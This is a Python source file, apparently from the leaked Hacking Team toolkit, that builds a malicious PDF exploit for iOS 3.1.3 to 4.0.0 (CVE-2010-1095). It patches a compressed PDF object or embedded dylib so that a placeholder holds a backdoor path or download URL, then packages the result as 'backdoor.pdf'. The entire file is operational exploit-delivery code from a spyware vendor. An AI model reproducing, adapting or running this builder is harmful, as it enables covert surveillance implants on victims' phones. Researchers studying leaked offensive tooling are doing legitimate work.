#! /usr/bin/env python

#Copyright HT srl, 2009-2010
#http://www.hackingteam.it/ for more information

#cod
#kiodo

# ios_pdf

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
from xml.dom import minidom
from random import *

import hex2bin

NAME='ios_pdf'
DESCRIPTION='[+] ios_pdf xml builder'

DOCUMENTATION={}
DOCUMENTATION['Vendor']=''
DOCUMENTATION['Date public']='2010/07/01'
DOCUMENTATION['References']='http://www.apple.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE']='CVE-2010-1095'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1095"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['iOS']]
PROPERTY['VERSION']=['3.1.3','4.0.0']
PROPERTY['VENDOR']='Apple'
PROPERTY['DELIVERY']='local'

NOTES="""
Tested on:
"""

CHANGELOG="""
"""

# Global payload
payload = 0
officeVer = 0
extraPath = None

#from pyPdf.pdf import *
#from pyPdf.generic import *
#from pyPdf.filters import *

class iOS_pdf():

	def __init__(self, xmlInputFile, backdoorPath, zipFile):
		#self.setInfo(DESCRIPTION)
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.xmlInputFile = xmlInputFile
		self.backdoorPath = backdoorPath
		self.zipFile = zipFile
		self.tempBackdoorName = self.randfilename()
		self.params = dict()
		self.reset = "0"
		return

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename

	# Return PDF template in hex
	def get_template(self):
		bin = self.params['template']
		
		if self.reset == "0":
			h = hex2bin.hex2bin()
			value = h.get(bin)
		else:
			h = open(self.params['template'], mode='rb')
			value = h.read()
			h.close()
			
		return value
	
	def get_newdylib(self):
		bin = self.params['newdylib']
		h = hex2bin.hex2bin()
		value = h.get(bin)
		return value
		
	def byteArray2String(self, param):
		with warnings.catch_warnings():
				warnings.simplefilter('ignore')
				tmp = os.tempnam()

		f = open(tmp, 'wb')
		f.write(param)
		f.close()
		
		f = open(tmp, 'rb')
		result = f.read()
		f.close()
		
		try:
			os.unlink(tmp)
		except WindowsError:
			print "I/O error when deleting %s file"%(tmp)
		
		return result
		
	"""
	patch pdf template
	"""
	def patch_template(self, data, hoststring, obj13offset, obj13length, newhost):
		print "Obj13 Length: %d"%(len(data))
		#print data
		print "Get obj13 from PDF (%d:%d)"%(obj13offset, obj13length)
				
		obj13 = data[obj13offset : obj13offset+obj13length]
	
		print "Read %d data"%(len(obj13))
		#f = open('c:\\temp\\obj13.bin', mode='wb')
		#f.write(obj13)
		#f.close()
		
		obj13 = bytearray(zlib.decompress(obj13))
		
		print "Find %s to replace with %s"%(hoststring, newhost)
		
		if self.reset == "0":
			start = obj13.index(b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIILLLLMMMMNNNNXXXXYYYYZZZZ")
			
			for i in range(len(newhost)):
				if i < len(hoststring):
					obj13[start + i] =newhost[i]
				
			if len(newhost) < len(hoststring):
				obj13[start + len(newhost) + 0] = 0x00

			## TODO ## PORKODEMONIO ## 
			obj13 = self.byteArray2String(obj13)
			
			obj13 = bytearray(zlib.compress(obj13, 6))
			
			data = bytearray(data)
			
			for i in range(len(obj13)):
				data[obj13offset + i] = obj13[i]
		else:
			# new file format...
			dylib = obj13[int(self.params['DYLIB_OFFSET']) : int(self.params['DYLIB_LENGTH'])]
			newdylib = self.get_newdylib()
			
			start = newdylib.index(b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIILLLLMMMMNNNNXXXXYYYYZZZZ")
			
			newdylib = bytearray(newdylib)
			
			for i in range(len(newhost)):
				if i < len(hoststring):
					newdylib[start + i] =newhost[i]
				
			if len(newhost) < len(hoststring):
				newdylib[start + len(newhost) + 0] = 0x00

			## TODO ## PORKODEMONIO ## 
			newdylib = self.byteArray2String(newdylib)
			
			newdylib = bytearray(zlib.compress(newdylib))
			
			dyliboffset = int(self.params['DYLIB_OFFSET'])
			dyliblength = int(self.params['DYLIB_LENGTH'])
			
			for i in range(dyliblength):
				obj13[dyliboffset + i] = 0x00
			
			for i in range(len(newdylib)):
				obj13[dyliboffset + i] = newdylib[i]
			
			obj13 = self.byteArray2String(obj13)
			obj13 = bytearray(zlib.compress(obj13))
			
			data = bytearray(data)
			
			for i in range(len(obj13)):
				data[obj13offset + i] = obj13[i]
		
		
		return data

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def parse_attrib(self, xmlNode):
		#print "Entering in parse attrib %s"%(xmlNode.toxml())
		
		if xmlNode.hasAttributes() == False:
			print "No attribuytes found in parse_attrib: %s"%(xmlNode.toxml())
			sys.exit(0)
		name = xmlNode.getAttribute('name')
		value = xmlNode.getAttribute('value')
		
		print "Attribute %s"%(name)
		self.params[name] = value
		
	def parse_info(self, xmlNode):
		#print "Entering in parse info %s"%(xmlNode.toxml())
		
		if xmlNode.hasAttributes() == False:
			print "No attributes found in parse_node: %s"%(xmlNode.toxml())
			sys.exit(0)
		
		self.name = xmlNode.getAttribute('name')
		self.version = xmlNode.getAttribute('version')
		self.reset = xmlNode.getAttribute('reset')

		if self.reset == "":
			self.reset = "0"
			
		print "Exploit config: %s %s %s"%(self.name, self.version, self.reset)

	# parse_directory
	#  Explore a <directory> node
	def parse_directory(self, zipEngine, baseDir, xmlNode):
		if xmlNode.hasAttributes() == False:
			print "No attributes found in parse_directory: %s"%(xmlNode.toxml())
			sys.exit(0)

		for i in range(xmlNode.childNodes.length):
			node = xmlNode.childNodes[i]
			
			if node.nodeType != node.TEXT_NODE:
				if node.tagName == "file":
					self.parse_file(zipEngine, baseDir + xmlNode.getAttribute('name') + '\\', node)
				elif node.tagName == "directory":
					self.parse_directory(zipEngine, baseDir +  xmlNode.getAttribute('name') + '\\', node)
		
		return

	def parse_root(self, zipEngine, baseDir, xmlNode):
		for i in range(xmlNode.childNodes.length):
			node = xmlNode.childNodes[i]
			
			#print "Node Type: %d -> Value: %s" %(node.nodeType, node.toxml())
			
			if node.nodeType != node.TEXT_NODE:
				if node.tagName == "info":
					self.parse_info(node)
				elif node.tagName == "attrib":
					self.parse_attrib(node)
		
		return
		
	def make(self):

		# Create the output archive
		print "Creating %s zip file archive"%(self.zipFile)
		zip = zipfile.ZipFile(self.zipFile, "w", zipfile.ZIP_DEFLATED)

		# Opening xml dom
		print "Opening %s xml" %(self.xmlInputFile)
		
		try:
			root = minidom.parse(self.xmlInputFile)
			
			for i in range(root.childNodes.length):
				node = root.childNodes[i]
				print "Parsing node %s in %s"%(node.tagName, "")
			
				if node.tagName == "root":
					self.parse_root(zip, "", node)
				else:
					print "Skip node"
	
			print "Parsing file complete"
		except Exception, e:
			print "Error in parsing %s"%(self.xmlInputFile)
			print e


		with warnings.catch_warnings():
				warnings.simplefilter('ignore')
				tmp = os.tempnam()

		pdf = self.get_template()
		pdf = self.patch_template(pdf, self.params['host_string'], int(self.params['OBJ_13_OFFSET']), int(self.params['OBJ_13_LENGTH']), self.backdoorPath)
		
		print "Writing temp files %s" %(tmp)
		f = open(tmp,mode='wb')
		f.write(pdf)
		f.close()
		
		print "Adding backdoor.pdf"
		zip.write(tmp, "backdoor.pdf")
		
		try:
			os.unlink(tmp)
		except WindowsError:
			print "I/O error when deleting %s file"%(tmp)
		
		zip.close()
		return

	def run(self):
		self.make()
		return 1

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 4:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] xml:rule [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "xml":
		print "[ERROR] First parameters must be xml"
		sys.exit(0)
	
	# Interprete section

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app= iOS_pdf(sys.argv[1].split(':')[1], sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'